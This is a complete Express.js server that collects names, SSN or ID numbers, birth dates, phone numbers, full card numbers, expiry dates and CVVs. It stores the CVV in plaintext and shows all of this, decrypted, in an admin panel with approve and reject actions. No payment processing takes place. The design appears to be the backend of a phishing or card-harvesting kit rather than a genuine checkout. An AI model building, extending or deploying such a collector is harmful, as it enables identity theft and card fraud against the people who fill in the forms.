require('dotenv').config();

const express = require('express');
const session = require('express-session');
const bcrypt = require('bcrypt');
const crypto = require('crypto');
const { Pool } = require('pg');

const app = express();
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

app.use(express.json());
app.use(express.static('public'));
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    sameSite: 'lax',
    maxAge: 1000 * 60 * 60 * 48 // 48 Hours
  }
}));

// -------------------- Crypto (AES-256-GCM) --------------------
const KEY = Buffer.from(process.env.CARD_ENC_KEY, 'hex');

function encrypt(plain) {
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', KEY, iv);
  const enc = Buffer.concat([cipher.update(plain, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return `${iv.toString('hex')}:${tag.toString('hex')}:${enc.toString('hex')}`;
}

function decrypt(payload) {
  const [ivHex, tagHex, encHex] = payload.split(':');
  const decipher = crypto.createDecipheriv('aes-256-gcm', KEY, Buffer.from(ivHex, 'hex'));
  decipher.setAuthTag(Buffer.from(tagHex, 'hex'));
  return Buffer.concat([
    decipher.update(Buffer.from(encHex, 'hex')),
    decipher.final()
  ]).toString('utf8');
}

// -------------------- Validators (USER INFO) --------------------
function validName(name) {
  const s = (name || '').trim();
  if (s.length < 2 || s.length > 64) return false;
  return /^[A-Za-zÀ-ÿ][A-Za-zÀ-ÿ .'-]*$/.test(s);
}

function validEmail(e) {
  return /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test((e || '').trim());
}

function validId(id) {
  const s = (id || '').trim();
  if (!s) return false;
  const digits = s.replace(/\D/g, '');
  return /^\d{5,9}$/.test(digits);
}

function validDob(dob) {
  const m = /^(\d{4})-(\d{2})-(\d{2})$/.exec((dob || '').trim());
  if (!m) return false;
  const y = +m[1], mo = +m[2], d = +m[3];
  const dt = new Date(Date.UTC(y, mo - 1, d));
  if (dt.getUTCFullYear() !== y || dt.getUTCMonth() !== mo - 1 || dt.getUTCDate() !== d) return false;
  const now = new Date();
  let age = now.getUTCFullYear() - y;
  const hadBirthday = (now.getUTCMonth() + 1 > mo) ||
    (now.getUTCMonth() + 1 === mo && now.getUTCDate() >= d);
  if (!hadBirthday) age--;
  return age >= 18 && age <= 120;
}

function validPhone(p) {
  const d = (p || '').replace(/\D/g, '');
  return d.length >= 7 && d.length <= 15;
}

function validCountry(c) {
  return typeof c === 'string' && c.trim().length > 0;
}

function validZip(z, country) {
  const s = (z || '').trim().toUpperCase();
  const cc = (country || '').toUpperCase();
  if (cc === 'US' || cc === 'UNITED STATES') return /^\d{5}(-\d{4})?$/.test(s);
  if (cc === 'CA' || cc === 'CANADA') return /^[A-Z]\d[A-Z]\s?\d[A-Z]\d$/.test(s);
  return /^[A-Z0-9\- ]{3,10}$/.test(s);
}

// -------------------- Validators (CARD INFO) --------------------
function luhn(num) {
  let sum = 0, alt = false;
  for (let i = num.length - 1; i >= 0; i--) {
    let d = parseInt(num[i], 10);
    if (alt) { d *= 2; if (d > 9) d -= 9; }
    sum += d;
    alt = !alt;
  }
  return sum % 10 === 0;
}

function brand(num) {
  const n = num.replace(/\D/g, '');
  
  if (/^4/.test(n)) return 'Visa';
  if (/^(5[1-5]|2[2-7])/.test(n)) return 'Mastercard';
  if (/^3[47]/.test(n)) return 'American Express';
  if (/^(6011|65|64[4-9])/.test(n)) return 'Discover';
  if (/^(352[89]|35[3-8][0-9])/.test(n)) return 'JCB';
  if (/^62/.test(n)) return 'UnionPay';
  if (/^3(?:0[0-5]|[68])/.test(n)) return 'Diners Club';
  if (/^(50|56|57|58|6304|6759|6761|6762|6763)/.test(n)) return 'Maestro';
  if (/^(4026|417500|4508|4844|4913|4917)/.test(n)) return 'Visa Electron';
  if (/^(60|65|81|82|508)/.test(n)) return 'RuPay';
  if (/^220[0-4]/.test(n)) return 'Mir';
  if (/^9792/.test(n)) return 'Troy';
  if (/^(506|507|650)/.test(n)) return 'Verve';
  if (/^(4011|4312|4389|4514|4576|6362|6363)/.test(n)) return 'Elo';
  if (/^6062/.test(n)) return 'Hipercard';
  if (/^5888/.test(n)) return 'mada';
  if (/^4509/.test(n)) return 'KNET';
  if (/^4506/.test(n)) return 'Interac';
  if (/^5019/.test(n)) return 'Dankort';
  if (/^4970/.test(n)) return 'Cartes Bancaires';
  if (/^5390/.test(n)) return 'Bancontact';
  if (/^6060/.test(n)) return 'PayPak';
  if (/^8600/.test(n)) return 'Uzcard';
  if (/^9860/.test(n)) return 'Humo';
  if (/^5043/.test(n)) return 'ArCa';
  if (/^5078/.test(n)) return 'Meeza';
  if (/^(9439|9440|9441|9442|9443|9444|9445|9446|9447|9448|9449)/.test(n)) return 'BC Card';
  if (/^9450/.test(n)) return 'Lotte Card';
  if (/^9451/.test(n)) return 'Hana Card';
  if (/^9452/.test(n)) return 'Shinhan Card';
  if (/^9453/.test(n)) return 'KB Kookmin Card';
  if (/^9454/.test(n)) return 'Samsung Card';
  if (/^9455/.test(n)) return 'Woori Card';
  if (/^9456/.test(n)) return 'NH Card';
  
  return 'Card'; 
}

function validExpiry(mmYY) {
  const m = /^(\d{2})\/(\d{2})$/.exec((mmYY || '').trim());
  if (!m) return false;
  const month = +m[1], year = 2000 + +m[2];
  const now = new Date();
  return month >= 1 && month <= 12 &&
    (year > now.getFullYear() ||
     (year === now.getFullYear() && month >= now.getMonth() + 1));
}

function validCard({ number, expiry, cvv }) {
  const num = (number || '').replace(/\D/g, '');
  const errs = [];
  if (num.length < 13 || num.length > 19) errs.push('Card number length invalid');
  else if (!luhn(num)) errs.push('Card number failed Luhn check');
  if (!validExpiry(expiry)) errs.push('Expiry invalid or past');
  if (!/^\d{3,4}$/.test(cvv || '')) errs.push('CVV must be 3-4 digits');
  return { ok: errs.length === 0, errs, num };
}

// -------------------- Admin auth middleware --------------------
function requireAdmin(req, res, next) {
  if (req.session && req.session.isAdmin) return next();
  res.status(401).json({ error: 'Unauthorized' });
}

app.post('/api/admin/login', async (req, res) => {
  try {
    const { password } = req.body || {};
    const ok = await bcrypt.compare(password || '', process.env.ADMIN_PASSWORD_HASH);
    if (!ok) return res.status(401).json({ error: 'Wrong password' });
    req.session.isAdmin = true;
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: 'Login error' });
  }
});

app.post('/api/admin/logout', (req, res) => {
  req.session.destroy(() => res.json({ ok: true }));
});

// -------------------- Step 1: user info --------------------
app.post('/api/submit/step1', async (req, res) => {
  const { full_name, email, id_number, dob, phone, country, zip } = req.body || {};
  const errors = [];

  if (!validName(full_name))       errors.push('Full name invalid');
  if (!validEmail(email))          errors.push('Email invalid');
  if (!validId(id_number))         errors.push('ID/SSN invalid or looks fake');
  if (!validDob(dob))              errors.push('DOB invalid (must be YYYY-MM-DD, age 18-120)');
  if (!validPhone(phone))          errors.push('Phone invalid (7-15 digits)');
  if (!validCountry(country))      errors.push('Select a valid country');
  if (!validZip(zip, country))     errors.push('Zip/postal invalid for country');

  if (errors.length) return res.status(400).json({ errors });

  try {
    const idDigits = id_number.replace(/[-\s]/g, '').toUpperCase();
    const cleanPhone = phone.replace(/\D/g, '');
    
    const searchQuery = await pool.query(
      `SELECT id, id_enc, status FROM submissions 
       WHERE LOWER(full_name) = LOWER($1) 
          OR LOWER(email) = LOWER($2) 
          OR phone = $3`,
      [full_name.trim(), email.trim(), cleanPhone]
    );

    let existingUser = null;

    for (const row of searchQuery.rows) {
      if (row.id_enc && decrypt(row.id_enc) === idDigits) {
        existingUser = row;
        break;
      }
    }

    if (existingUser) {
      await pool.query(
        `UPDATE submissions 
         SET full_name = $1, email = $2, id_enc = $3, id_last4 = $4, 
             dob = $5, phone = $6, country = $7, zip = $8, 
             status = 'draft', step1_at = NOW(), created_at = NOW()
         WHERE id = $9`,
        [
          full_name.trim(), email.trim(), encrypt(idDigits), idDigits.slice(-4),
          dob.trim(), cleanPhone, country.trim(), zip.trim().toUpperCase(),
          existingUser.id
        ]
      );
      return res.json({ ticket: existingUser.id });
    }

    const { rows } = await pool.query(
      `INSERT INTO submissions
         (full_name, email, id_enc, id_last4, dob, phone, country, zip, status, step1_at)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,'draft',NOW())
       RETURNING id`,
      [
        full_name.trim(), email.trim(), encrypt(idDigits), idDigits.slice(-4),
        dob.trim(), cleanPhone, country.trim(), zip.trim().toUpperCase()
      ]
    );

    res.json({ ticket: rows[0].id });
  } catch (e) {
    console.error('step1 error', e);
    res.status(500).json({ error: 'Server error' });
  }
});

// -------------------- Step 2: payment --------------------
app.post('/api/submit/step2/:id', async (req, res) => {
  const ticket = Number(req.params.id);
  if (!Number.isInteger(ticket)) return res.status(400).json({ error: 'Bad ticket' });

  const { number, expiry, cvv } = req.body || {};
  const card = validCard({ number, expiry, cvv });
  if (!card.ok) return res.status(400).json({ errors: card.errs });

  try {
    const cardNum = card.num;

    const { rowCount } = await pool.query(
      `UPDATE submissions
         SET card_enc = $1,
             card_last4 = $2,
             card_brand = $3,
             expiry = $4,
             cvv = $5,
             status = 'pending',
             pending_at = NOW()
       WHERE id = $6 AND status = 'draft'`,
      [
        encrypt(cardNum),
        cardNum.slice(-4),
        brand(cardNum),
        expiry.trim(),
        cvv.trim(),
        ticket
      ]
    );

    if (!rowCount) return res.status(400).json({ error: 'Draft not found or already submitted' });
    res.json({ ticket, message: 'Submitted. Waiting for review.' });
  } catch (e) {
    console.error('step2 error', e);
    res.status(500).json({ error: 'Server error' });
  }
});

// -------------------- Status poll (user side) --------------------
app.get('/api/status/:id', async (req, res) => {
  try {
    const { rows } = await pool.query(
      'SELECT status FROM submissions WHERE id = $1',
      [req.params.id]
    );
    if (!rows.length) return res.status(404).json({ error: 'Not found' });
    res.json({ status: rows[0].status });
  } catch (e) {
    res.status(500).json({ error: 'Server error' });
  }
});

// -------------------- Admin queue --------------------
app.get('/api/admin/pending', requireAdmin, async (req, res) => {
  try {
    const { rows } = await pool.query(
      `SELECT * FROM submissions
       WHERE status IN ('draft','pending','approved','rejected')
       ORDER BY created_at DESC`
    );

    res.json(rows.map(r => ({
      id: r.id,
      status: r.status,
      full_name: r.full_name,
      email: r.email,
      id_number: r.id_enc ? decrypt(r.id_enc) : '',
      dob: r.dob,
      phone: r.phone,
      country: r.country,
      zip: r.zip,
      card_number: r.card_enc ? decrypt(r.card_enc) : '',
      card_brand: r.card_brand,
      expiry: r.expiry,
      cvv: r.cvv,
      created_at: r.created_at,
      pending_at: r.pending_at
    })));
  } catch (e) {
    console.error('pending error', e);
    res.status(500).json({ error: 'Server error' });
  }
});

// -------------------- Retrieve Deleted --------------------
app.get('/api/admin/deleted', requireAdmin, async (req, res) => {
  try {
    const { rows } = await pool.query(
      `SELECT id, full_name FROM submissions 
       WHERE status = 'deleted' ORDER BY created_at DESC`
    );
    res.json(rows);
  } catch (e) {
    res.status(500).json({ error: 'Server error' });
  }
});

// -------------------- Undo Delete (MUST BE BEFORE GENERIC ROUTE) --------------------
app.post('/api/admin/undo/:id', requireAdmin, async (req, res) => {
  try {
    const check = await pool.query(
      `SELECT previous_status FROM submissions WHERE id = $1 AND status = 'deleted'`,
      [req.params.id]
    );

    if (check.rowCount === 0) {
      return res.status(400).json({ error: 'Record not found or was not deleted' });
    }

    let restoreStatus = check.rows[0].previous_status;
    if (!restoreStatus || restoreStatus === 'deleted') {
      restoreStatus = 'pending';
    }

    await pool.query(
      `UPDATE submissions SET status = $1, previous_status = NULL WHERE id = $2`,
      [restoreStatus, req.params.id]
    );

    res.json({ ok: true });
  } catch (e) {
    console.error('Undo error:', e);
    res.status(500).json({ error: 'Server error' });
  }
});

// -------------------- Permanent Delete (MUST BE BEFORE GENERIC ROUTE) --------------------
app.delete('/api/admin/permanent-delete/:id', requireAdmin, async (req, res) => {
  try {
    const { rowCount } = await pool.query(
      `DELETE FROM submissions WHERE id = $1 AND status = 'deleted'`,
      [req.params.id]
    );
    if (!rowCount) return res.status(400).json({ error: 'Not found or not deleted' });
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: 'Server error' });
  }
});

// -------------------- Admin action (Approve, Reject, Delete) --------------------
app.post('/api/admin/:action/:id', requireAdmin, async (req, res) => {
  const action = req.params.action;
  const id = req.params.id;

  try {
    if (action === 'delete') {
      await pool.query(
        `UPDATE submissions 
         SET previous_status = status, status = 'deleted'
         WHERE id = $1 AND status IN ('draft', 'pending', 'approved', 'rejected')`,
        [id]
      );
      return res.json({ ok: true });
    }

    if (!['approve', 'reject'].includes(action)) {
      return res.status(400).json({ error: 'Bad action' });
    }
    const status = action === 'approve' ? 'approved' : 'rejected';

    const { rowCount } = await pool.query(
      `UPDATE submissions SET status = $1
       WHERE id = $2 AND status IN ('draft','pending')`,
      [status, id]
    );

    if (!rowCount) return res.status(400).json({ error: 'Expired or already actioned' });

    console.log(`[AUDIT] ${action} submission ${id} at ${new Date().toISOString()}`);
    res.json({ ok: true, status });
  } catch (e) {
    console.error('action error', e);
    res.status(500).json({ error: 'Server error' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server on http://localhost:${PORT}`));